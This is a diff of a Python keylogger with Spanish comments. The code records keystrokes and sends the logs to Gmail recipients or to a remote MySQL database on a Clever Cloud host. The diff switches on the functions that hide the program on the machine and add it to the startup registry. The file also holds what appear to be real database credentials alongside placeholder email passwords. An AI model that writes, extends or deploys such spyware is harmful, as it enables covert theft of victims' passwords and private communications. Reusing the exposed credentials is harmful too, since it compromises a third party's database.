@@ -63,9 +63,6 @@ def EscondeKey():
         except:
             print("\nHubo un problema al esconder el El keylogger")
 
-
-
-
 # Obtiene registro de teclas y guarda en un archivo reg.k
 def KeyLogger():
     # Convierte tecla a un valor legible
@@ -349,6 +346,7 @@ def SendLog():
                     print("[Database] Se subieron los datos correctamente")
                         # Elimina Registro Key
                     os.remove(pathN)
+                    connection.close()
                 except:
                     print("[Database] Error al subir los datos")
 
@@ -410,43 +408,35 @@ def FilePath():
 
 
 
-
-
 # ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
 
 # ************ Zona Gmail ************* 
-# Correo de envío [Primaria] 
-def emailP():                   # <<== Cambia éste correo
-    return "correo1@gmail.com" 
+def emailP():# Correo de envío [Primaria]                    
+    return "correo1@gmail.com"  # <<== Cambia éste correo
 def passP():                    # <<== Contraseña del correo
     return "contra1"
-# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
-def emailS():                   # <<== Cambia éste correo
-    return "correo2@gmail.com"
-def passS():                   # <<== Contraseña del correo 
-    return "pass2"
+def emailS():# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
+    return "correo2@gmail.com"  # <<== Cambia éste correo
+def passS():                   
+    return "pass2"              # <<== Contraseña del correo 
 
-#Correos que recibirán el registro de teclas.
-def ReceiveE():
+def ReceiveE():#Correos que recibirán el registro de teclas.
     #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
     return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
 # ************ Fin Zona Gmail ************* 
 
 # ************ Start Zone DATABASE ************* 
-
 def DB_HOST():
-    return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"                # Host
+    return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
 def DB_USER():
-    return "udwlsyrbtldkznqo"              # Usuario de la base de datos
+    return "udwlsyrbtldkznqo"                                       # Usuario de la base de datos
 def DB_PASS():
-    return "OR2i2dfdgWek0UDiAv4f"              # Contraseña de la Base de Datos
+    return "OR2i2dfdgWek0UDiAv4f"                                   # Contraseña de la Base de Datos
 def DB_NAME():
-    return "bh1g5gnxzw2igrvui8hq"   # Nombre de Base de datos
+    return "bh1g5gnxzw2igrvui8hq"                                   # Nombre de Base de datos
 def DB_PORT(): 
-    return "3306"    # Opcional en algunos casos
-
-
+    return "3306"                                                   # Opcional en algunos casos
 
 # ************ Fin Zone DATABASE ************* 
 def GMailOrDataBase():
@@ -469,21 +459,11 @@ def timeSend(): # Tiempo de envío perzonalizado
 
 # ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
-
-
-
-
-
-    # API client does not know about the token
-    # until explicitly told about it:
-
 # Inicio multihilo
 if __name__ == '__main__':
 
-    #SendDataBaseMySQL()
-
-    #EscondeKey()    # Se replica dentro de la computadora
-    #addStartup()    # Modifica registro de arranque
+    EscondeKey()    # Se replica dentro de la computadora
+    addStartup()    # Modifica registro de arranque
     p1 = threading.Thread(target=KeyLogger)   # Registra teclas
 
     p2 = threading.Thread(target=SendLog)   # Enviar Registro
